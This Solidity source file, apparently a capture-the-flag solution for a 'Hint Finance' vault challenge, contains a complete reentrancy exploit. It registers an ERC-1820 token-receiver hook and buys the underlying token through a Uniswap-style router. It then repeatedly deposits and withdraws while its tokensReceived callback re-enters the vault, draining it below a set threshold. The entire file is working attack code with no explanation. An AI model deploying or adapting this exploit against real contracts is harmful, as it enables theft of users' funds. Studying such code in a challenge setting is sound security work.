// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import "./HintFinanceVault.sol";
import "./Setup.sol";

contract Exploit2 {
    HintFinanceVault public hintFinanceVault;
    uint8 public toggle = 1;
    string internal constant AMP_TOKENS_RECIPIENT = "AmpTokensRecipient";

    constructor(address _hintFinanceVault) {
        hintFinanceVault = HintFinanceVault(_hintFinanceVault);
    }

    function registerInterface() external {
        bytes32 interfaceHash = keccak256(
            abi.encodePacked(AMP_TOKENS_RECIPIENT)
        );
        bytes memory payload = abi.encodeWithSignature(
            "setInterfaceImplementer(address,bytes32,address)",
            address(this),
            interfaceHash,
            address(this)
        );
        (bool success, ) = address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .call(payload);
        require(success, "Register Interface Failed");
    }

    function getUnderlying() external payable {
        UniswapV2RouterLike router = UniswapV2RouterLike(
            0xf164fC0Ec4E93095b804a4795bBe1e041497b92a
        );
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address[] memory path = new address[](2);
        path[0] = weth;

        path[1] = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
        router.swapExactETHForTokens{value: 10 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function exploit() internal {
        ERC20Like(0xfF20817765cB7f73d4bde2e66e067E58D11095C2).approve(
            address(hintFinanceVault),
            type(uint256).max
        );

        hintFinanceVault.deposit(
            ERC20Like(0xfF20817765cB7f73d4bde2e66e067E58D11095C2).balanceOf(
                address(this)
            )
        );

        hintFinanceVault.withdraw(hintFinanceVault.balanceOf(address(this)));

        hintFinanceVault.withdraw(hintFinanceVault.balanceOf(address(this)));

        toggle = 1;
    }

    function totalExploit() external payable {
        while (
            ERC20Like(0xfF20817765cB7f73d4bde2e66e067E58D11095C2).balanceOf(
                address(hintFinanceVault)
            ) > 23974000000000000000000
        ) {
            exploit();
        }
    }

    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        /* if (
            ERC20Like(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD).balanceOf(
                address(hintFinanceVault)
            ) > 600000000000000000000
        ) {
            hintFinanceVault.deposit(
                ERC20Like(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD).balanceOf(
                    address(this)
                )
            );

            hintFinanceVault.withdraw(
                hintFinanceVault.balanceOf(address(this))
            );
        } */

        if (toggle == 1) {
            hintFinanceVault.deposit(
                ERC20Like(0xfF20817765cB7f73d4bde2e66e067E58D11095C2).balanceOf(
                    address(this)
                )
            );
            toggle = 0;
        }
    }
}
